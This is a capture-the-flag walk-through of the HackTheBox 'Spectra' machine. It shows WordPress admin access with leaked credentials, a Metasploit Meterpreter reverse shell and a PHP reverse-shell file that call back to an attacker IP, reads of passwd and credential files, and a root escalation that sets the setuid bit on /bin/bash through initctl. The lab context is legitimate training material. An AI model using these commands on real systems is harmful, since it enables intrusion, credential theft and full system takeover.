---
title: "Walk-through of Spectra from HackTheBox"
header:
  teaser: /assets/images/2021-03-22-21-28-14.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - WordPress
  - Meterpreter
  - Initctl
---

## Machine Information

![spectra](/assets/images/2021-03-22-21-28-14.png)

Spectra is rated as an easy machine on HackTheBox. We start by finding a WordPress site and soon after credentials to access its administration dashboard. We use Meterpreter to gain a reverse shell, and from there we find credentials which gives us SSH access as a user. Then it's a simple SUDO permission that let's us manipulate init processes to gain root. I also show an alternate method using WordPress themes instead of Meterpreter to gain initial access.

<!--more-->
Skills required are basic port enumeration and exploration knowledge. Skills learned are reverse shells to WordPress using Meterpreter, as well as exploiting initctl permissions.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Spectra](https://www.hackthebox.eu/home/machines/profile/317) |
| Machine Release Date | 27th Feb 2021 |
| Date I Completed It | 22nd March 2021 |
| Distribution Used | Kali 2021.1 – [Release Info](https://www.kali.org/blog/kali-linux-2021-1-release) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root💀kali)-[~/htb/spectra]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.229 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root💀kali)-[~/htb/spectra]
└─# nmap -p$ports -sC -sV -oA spectra 10.10.10.229
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-21 16:39 GMT
Nmap scan report for 10.10.10.229
Host is up (0.024s latency).

PORT     STATE SERVICE          VERSION
22/tcp   open  ssh              OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http             nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql            MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
8081/tcp open  blackice-icecap?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 21 Mar 2021 16:39:18 GMT
|     Connection: close
|     Hello World
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-Type: text/plain
|     Date: Sun, 21 Mar 2021 16:39:23 GMT
|     Connection: close
|_    Hello World

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.62 seconds
```

We have a few open ports, let's start with nginx on port 80. First add IP to hosts file:

```text
┌──(root💀kali)-[/home/kali]
└─# echo "10.10.10.229 spectra.htb" >> /etc/hosts

┌──(root💀kali)-[/home/kali]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.10.10.229 spectra.htb
```

## Website Enumeration

Now let's browse to the site:

![spectra](/assets/images/2021-03-21-16-46-59.png)

Just a simple web page with two links, let's try the first one for the tracker:

![spectra-wordpress](/assets/images/2021-03-21-16-50-24.png)

This takes is us to an empty WordPress site, with just a sample post by the user administrator. Nothing obvious here, let's try the other link:

![wordpress-testing](/assets/images/2021-03-21-16-53-21.png)

We get an error connecting to database, but if we try to browse the folder instead we see what looks like a test version of WordPress:

![wordpress-file-list](/assets/images/2021-03-21-16-54-58.png)

My eyes are drawn to the file wp-config.php.save, looking at it's contents we have possible credentials:

```text
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
define( 'DB_PASSWORD', '<<HIDDEN>>' );
```

I tried logging in with the username and password found in the config file, but no luck:

![spectra-login](/assets/images/2021-03-21-17-00-24.png)

However, the error message is helpful as it says username not known, let's try administrator which we saw before had done the first post:

![spectra-admin-login](/assets/images/2021-03-21-17-02-51.png)

We're logged in as administrator. At this point we can either use Meterpreter to get a reverse shell, or we can change one of the template files from within the WordPress admin site and put our own reverse shell in it.

## Meterpreter Shell

Let's do it with Meterpreter first, then I'll show you the template way later. Fire up MSF and find the wp_admin_shell module:

```text
┌──(root💀kali)-[~/htb/spectra]
└─# msfdb start
[+] Starting database

┌──(root💀kali)-[~/htb/spectra]
└─# msfconsole 

       =[ metasploit v6.0.35-dev                          ]
+ -- --=[ 2106 exploits - 1134 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: View missing module options with show missing
msf6 > search wp_admin_shell

Matching Modules
================

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
```

Now let's set all the options:

```text
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.10.10.229
rhost => 10.10.10.229
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.114
lhost => 10.10.14.114
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 1234
lport => 1234
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username administrator
username => administrator
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password <<HIDDEN>>
password => devteam01
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /main
targeturi => /main
```

Let's start the exploit and let Meterpreter do it's work:

```text
msf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit

[*] Started reverse TCP handler on 10.10.14.114:1234 
[*] Authenticating with WordPress using administrator:<<HIDDEN>>...
[+] Authenticated with WordPress
[*] Preparing payload...
[*] Uploading payload...
[*] Executing the payload at /main/wp-content/plugins/VtEDxftBOy/PiCsbQivTC.php...
[*] Sending stage (39282 bytes) to 10.10.10.229
[*] Meterpreter session 1 opened (10.10.14.114:1234 -> 10.10.10.229:35050) at 2021-03-21 17:26:27 +0000
[+] Deleted PiCsbQivTC.php
[+] Deleted VtEDxftBOy.php
[+] Deleted ../VtEDxftBOy

meterpreter > 
```

First thing is get ourselves a proper shell:

```text
meterpreter > shell
Process 4770 created.
Channel 0 created.
sh: 0: getcwd() failed: No such file or directory
sh: 0: getcwd() failed: No such file or directory

cd tmp
python3 -c "import pty;pty.spawn('/bin/bash')"
nginx@spectra /tmp $ 
```

## User Flag

Ok, that's a much more workable environment. Let's check for users:

```text
nginx@spectra / $ cat /etc/passwd 
<SNIP>
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
```

I see another user in the passwd file called katie, let's look at /home:

```text
nginx@spectra / $ ls -l /home
total 20
drwxr-xr-x 20 chronos chronos 4096 Mar 21 14:53 chronos
drwxr-xr-x  4 katie   katie   4096 Mar 21 15:14 katie
drwxr-xr-x  5 nginx   nginx   4096 Mar 21 15:30 nginx
drwxr-x--t  4 root    root    4096 Jul 20  2020 root
drwxr-xr-x  4 root    root    4096 Jul 20  2020 user

nginx@spectra / $ ls -l /home/katie/
total 320
drwxr-xr-x 2 katie katie   4096 Jan 15 15:55 log
-r-------- 1 katie katie     33 Feb  2 15:57 user.txt
```

So we need to find a way to move from our restricted nginx user to katie to get the flag. I dropped in lucky because the first place I looked was /opt:

```text
nginx@spectra ~ $ cd /opt
nginx@spectra /opt $ ls -l
total 36
drwxr-xr-x 2 root root 4096 Jun 28  2020 VirtualBox
-rw-r--r-- 1 root root  978 Feb  3 16:02 autologin.conf.orig
drwxr-xr-x 2 root root 4096 Jan 15 15:53 broadcom
drwxr-xr-x 2 root root 4096 Jan 15 15:54 displaylink
drwxr-xr-x 2 root root 4096 Jan 15 15:53 eeti
drwxr-xr-x 5 root root 4096 Jan 15 15:55 google
drwxr-xr-x 6 root root 4096 Feb  2 15:15 neverware
drwxr-xr-x 5 root root 4096 Jan 15 15:54 tpm1
drwxr-xr-x 5 root root 4096 Jan 15 15:54 tpm2
```

I see a file called autologin.conf.orig, which sounds very suspicious. Let's have a look at that first:

```text
nginx@spectra /opt $ cat autologin.conf.orig
cat autologin.conf.orig

<SNIP>
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
<SNIP>
```

It's a lengthy config script but there's a line in there that points us to /etc/autologin. Let's check that out:

```text
nginx@spectra /opt $ ls -l /etc/autologin
total 4
-rw-r--r-- 1 root root 19 Feb  3 16:43 passwd

nginx@spectra /opt $ cat /etc/autologin/passwd
<<HIDDEN>>
```

Nice. We've found a password which presumably is for katie as that's the only other user on the box. Let's try SSH as we know that's open from our scan earlier:

```text
┌──(kali㉿kali)-[~]
└─$ ssh katie@10.10.10.229
The authenticity of host '10.10.10.229 (10.10.10.229)' can't be established.
RSA key fingerprint is SHA256:lr0h4CP6ugF2C5Yb0HuPxti8gsG+3UY5/wKjhnjGzLs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.229' (RSA) to the list of known hosts.
Password: <HIDDEN>
katie@spectra ~ $
```

We're in. We know the user flag is here from looking before, so let's grab that before moving on:

```text
katie@spectra ~ $ cat user.txt 
<<HIDDEN>>
```

## Root Flag

Ok, now we need to find a way to escalate. There's few obvious things I always try before grabbing something like [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to do a more detailed look. I must be having a good day because I checked sudo privileges first and hit the jackpot:

```text
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

If you're not sure what initctl does then [this](https://linux.die.net/man/8/initctl) article helps:

```text
initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.

init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes.
```

So we can use initctl to control starting and stopping processes as system. Sounds like a nice simple way to get a root shell. First let's see what's /etc/init:

```text
katie@spectra /etc/init $ ls -l
total 752
<SNIP>
-rw-rw---- 1 root developers  478 Jun 29  2020 test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test1.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test10.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test2.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test3.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test4.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test5.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test6.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test7.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test8.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test9.conf
<SNIP>
```

Over 750 files! However these called test owned by the developer group look interesting. Let's check out the first one:

```text
katie@spectra /etc/init $ cat test.conf
description "Test node.js server"
author      "katie"
start on filesystem or runlevel [2345]
stop on shutdown
script
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
end script
pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script
pre-stop script
    rm /var/run/nodetest.pid
    echo
```

Looks like katie has been busy. We can replace the contents of this with our own code, let's get it to change permissions on /bin/bash so we can run it with root permissions as katie.

First find the test process:

```text
katie@spectra /etc/init $ sudo initctl list | grep test
test stop/waiting
test1 stop/waiting
test7 stop/waiting
test6 stop/waiting
test5 stop/waiting
test4 stop/waiting
test10 stop/waiting
```

It's already stopped, so we can edit the conf file and the start it again:

```text
katie@spectra /etc/init $ cat test.conf 
description "Test node.js server"
author      "katie"
start on filesystem or runlevel [2345]
stop on shutdown

script
chmod +s /bin/bash
end script
```

Now we can start the process:

```text
katie@spectra /etc/init $ sudo /sbin/initctl start test
test stop/waiting
```

Now we can simply run bash with the -p option to get our root shell:

```text
katie@spectra /etc/init $ /bin/bash -p
bash-4.3# whoami
root
```

Grab the root flag and we are done:

```text
bash-4.3# cat /root/root.txt 
<<HIDDEN>>
```

That was a nice simple box. Below is how you could get the initial shell by changing a file within the WordPress theme instead of using Meterpreter.

## WordPress Themes Method

From the dashboard go to Appearance and then Theme Editor:

![spectra-theme-editor](/assets/images/2021-03-21-17-19-04.png)

Then chose the 404.php file to edit:

![spectra-404.php](/assets/images/2021-03-21-17-19-41.png)

Over on Kali, copy an existing reverse shell to our current folder:

```text
┌──(root💀kali)-[~/htb/spectra]
└─# cp /usr/share/webshells/php/php-reverse-shell.php .
```

Edit it and change the IP to our TUN0:

```text

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.114';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

Copy the entire contents of the file, then switch back to WordPress and replace the 404.php file with our reverse shell:

![spectra-404](/assets/images/2021-03-21-17-13-40.png)

Click the Update File button to save your changes.

Now switch to Kali and start a netcat session waiting to catch the shell:

```text
root@kali:/home/kali/thm/internal# nc -nlvp 1234
listening on [any] 1234 ...
```

Then back to WordPress and browse to the 404.php we just changed:

![spectra-browse-404](/assets/images/2021-03-21-22-02-43.png)

At this point you can switch back to Kali and you should have a reverse shell connected. You could now continue from the same point as above when we got our initial Meterpreter shell.

All done. See you next time.
